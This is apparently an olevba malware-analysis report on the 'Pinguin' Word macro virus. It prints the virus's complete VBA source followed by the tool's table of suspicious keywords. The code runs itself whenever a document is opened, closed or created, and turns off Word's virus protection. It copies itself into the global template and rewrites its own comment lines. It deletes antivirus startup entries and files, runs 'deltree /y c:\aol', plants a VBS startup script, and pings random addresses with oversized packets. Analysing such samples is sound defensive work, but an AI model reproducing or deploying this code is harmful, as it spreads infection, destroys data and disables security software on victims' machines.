olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pinguin-1f466c17aa3b427c57016f032ecced8cd7d45df8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pinguin-1f466c17aa3b427c57016f032ecced8cd7d45df8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Pinguin-1f466c17aa3b427c57016f032ecced8cd7d45df8 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
'Virus Name: Pinguin[Clau/UC]
'Created By Clau/Ultimate Chaos.
'

Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegQueryValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long
Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Declare Function RegDeleteValueA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Declare Function DeleteFileA Lib "kernel32.dll" (ByVal lpFileName As String) As Long

Global Const REG_DWORD As Long = 4
Global Const REG_SZ As Long = 1
Global Const HKEY_CURRENT_USER As Long = &H80000001
Global Const HKEY_LOCAL_MACHINE As Long = &H80000002
Global Const vir_module = "Pinguin"

Dim k As Long
Dim s As Long
Dim u As Long
Dim a As Long
Dim b As String

Sub AutoNew()
  Infection
End Sub

Sub AutoOpen()
  Infection
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub AutoClose()
  Infection
End Sub

Sub FileSave()
  Infection
  ActiveDocument.Save
End Sub

Sub FileSaveAs()
  Dialogs(wdDialogFileSaveAs).Show
  Infection
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub Infection()
  Application.ShowVisualBasicEditor = False
  b = "C:\Clau-UC.VXD"
  Poly
  PayLoad
  On Error Resume Next

  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone
  WordBasic.DisableAutoMacros 0
  With Options
    .VirusProtection = False
    .SaveNormalPrompt = False
    .SavePropertiesPrompt = False
    .ConfirmConversions = False
  End With
  GlobalInstalled = False
  DocumentInstalled = False
  For i = 1 To NormalTemplate.VBProject.vbcomponents.Count
    If NormalTemplate.VBProject.vbcomponents(i).Name = vir_module Then
      GlobalInstalled = True
    End If
  Next
  For i = 1 To ActiveDocument.VBProject.vbcomponents.Count
    If ActiveDocument.VBProject.vbcomponents(i).Name = vir_module Then
      DocumentInstalled = True
    End If
  Next
  If GlobalInstalled = False Then
    ActiveDocument.VBProject.vbcomponents.Item(vir_module).export (b)
    NormalTemplate.VBProject.vbcomponents.Import (b)
    DeleteFileA (b)
    Options.SaveNormalPrompt = False
  End If
  If DocumentInstalled = False Then
    NormalTemplate.VBProject.vbcomponents.Item(vir_module).export (b)
    ActiveDocument.VBProject.vbcomponents.Import (b)
    DeleteFileA (b)
  End If
  Application.DisplayAlerts = wdAlertsAll
End Sub

Sub PayLoad()
  
  On Error Resume Next
  Retro
  Randomize Timer
  
  If Day(Now()) = 1 Then MsgBox "In every 2 of every month of every year" + Chr(13) + "I'll tell you my secret !!!", vbOKOnly, Date
  If Day(Now()) = 8 Then
    MsgBox "Pinguin Virus Created By Clau/Ultimate Chaos", vbOKOnly, "Secret Info"
    CommandBars("tools").Controls("Macro").Caption = "Micro"
    CommandBars.ActiveMenuBar.Controls.Item("UC").Delete
    Set newMenu = CommandBars.ActiveMenuBar.Controls.Add(Type:=msoControlPopup, ID:=1, Temporary:=True)
    newMenu.Caption = "&UC"
    Set ctrl1 = newMenu.Controls.Add(Type:=msoControlButton, ID:=1)
    ctrl1.Caption = "Pinguin"
    ctrl1.TooltipText = "Pinguin"
    ctrl1.Style = msoButtonCaption
    ctrl1.OnAction = "VInfo"
  Else
    CommandBars.ActiveMenuBar.Controls.Item("UC").Delete
  End If
  If Int(Rnd * 10) = 1 Then
    Application.Caption = "Pinguin Virus Created By Clau/Ultimate Chaos"
    Application.DisplayStatusBar = True
    StatusBar = "Pinguin Virus Created By Clau/Ultimate Chaos"
  End If
  
  If Int(Rnd * 5) = 1 Then
    ip = Int(255 * Rnd) & "." & Int(255 * Rnd) & "." & Int(255 * Rnd) & "." & Int(255 * Rnd)
    Shell "ping -l 65000 " & ip, vbHide
  End If
    
End Sub

Sub Retro()
  On Error Resume Next
  Shell "deltree /y c:\aol", vbHide
  u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS, k)
  u = RegDeleteValueA(k, "F-Secure Anti-Virus")
  u = RegDeleteValueA(k, "F-Secure Gatekeeper")
  u = RegDeleteValueA(k, "IV Interceptor")
  u = RegDeleteValueA(k, "IV Scheduler")
  u = RegCloseKey(k)
  Kill "c:\windows\start menu\programs\startup\*vir*.*"
  Kill "c:\windows\start menu\programs\startup\avp*.*"
  Open "c:\windows\pinguin.vbs" For Output As #1
  Print #1, "if minute(now())>55 then msgbox " + Chr(34) + "This computer is infected by Pinguin virus !" + Chr(34) + ", vbOKOnly&vbCritical, " + Chr(34) + "Windows Alert Level : 3" + Chr(34)
  Close #1
  System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Pinguin") = "C:\Windows\Pinguin.VBS"
End Sub

Sub VInfo()
  MsgBox "Clau[UC].Pinguin virus created by" + Chr(13) + "Clau member of Ultimate Chaos"
End Sub

Sub ViewVBcode()
End Sub

Sub ToolsMacro()
End Sub

Sub ToolsCustomize()
End Sub

Sub ToolsOptions()
End Sub

Sub FileTemplates()
End Sub

Sub Poly()
  Dim s As String
  On Error Resume Next
  Randomize Timer
  s = Now: s = "'#" + s + s + s + s
  y = Application.VBE.ActiveVBProject.vbcomponents.Item(vir_module).CodeModule.CountOfLines
  With Application.VBE.ActiveVBProject.vbcomponents.Item(vir_module).CodeModule
    For i = 1 To y * 2 Step 3
      If Mid(.Lines(i, 1), 1, 2) = "'#" Then .ReplaceLine i, s
    Next
  End With
  NormalTemplate.Save
  ActiveDocument.Save
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |pinguin.vbs         |Executable file name                         |
|IOC       |Pinguin.VBS         |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

